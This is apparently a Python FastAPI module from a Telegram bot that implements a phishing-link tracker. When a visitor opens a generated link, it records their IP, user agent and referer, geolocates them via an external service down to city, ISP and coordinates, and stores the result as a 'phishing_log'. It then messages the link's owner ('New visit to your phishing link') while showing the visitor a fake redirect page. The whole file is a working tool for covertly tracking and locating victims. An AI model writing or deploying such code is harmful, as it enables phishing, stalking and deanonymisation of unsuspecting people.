from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import datetime
import json
import db
import aiohttp

app = FastAPI()
BOT = None

def set_bot(bot_instance):
    global BOT
    BOT = bot_instance

@app.get("/log/{path}")
async def log_visit(request: Request, path: str):
    # Проверяем, существует ли такой путь (зеркало)
    # Мы не используем таблицу mirrors, просто генерируем путь при создании и сохраняем в лог
    # Для простоты будем считать любой путь валидным, но проверим в БД, есть ли запись для этого path
    # Мы будем хранить path в logs как query, но для простоты проверки не делаем
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "unknown")
    referer = request.headers.get("referer", "none")

    geo = {}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as", timeout=5) as resp:
                geo = await resp.json()
    except:
        geo = {"status": "fail"}

    # Определяем создателя по пути (path = user_id + timestamp)
    # Но мы будем передавать user_id в пути, например /log/8297446667_abc123
    # При создании ссылки мы сохраняем в БД связь path -> owner_id
    # Для упрощения будем парсить path: если он начинается с числа, считаем это user_id
    owner_id = None
    if path and path.split('_')[0].isdigit():
        owner_id = int(path.split('_')[0])

    # Сохраняем в лог
    log_entry = {
        "ip": client_ip,
        "user_agent": user_agent,
        "referer": referer,
        "geo": geo,
        "path": path,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=owner_id if owner_id else 0, action="phishing_log", query=path, result=json.dumps(log_entry, ensure_ascii=False))

    # Отправляем уведомление создателю (если owner_id найден)
    if owner_id and BOT:
        try:
            msg = (
                f"🕵️ <b>Новое посещение вашей фишинг-ссылки</b>\n\n"
                f"IP: <code>{client_ip}</code>\n"
                f"Страна: {geo.get('country', '—')}\n"
                f"Город: {geo.get('city', '—')}\n"
                f"Регион: {geo.get('regionName', '—')}\n"
                f"Провайдер: {geo.get('isp', '—')}\n"
                f"Координаты: {geo.get('lat', '—')}, {geo.get('lon', '—')}\n"
                f"User-Agent: {user_agent}\n"
                f"Реферер: {referer}"
            )
            await BOT.send_message(owner_id, msg, parse_mode="HTML")
        except:
            pass

    # Возвращаем пустую страницу (можно с картинкой-заглушкой)
    html = """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Загрузка...</title>
    <style>body { background: #0b0e14; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: Arial; }</style>
    </head>
    <body>
        <div style="text-align:center;">
            <h2>Подождите, идёт перенаправление...</h2>
            <p style="color:#6b7a93;">Пожалуйста, не закрывайте страницу.</p>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)
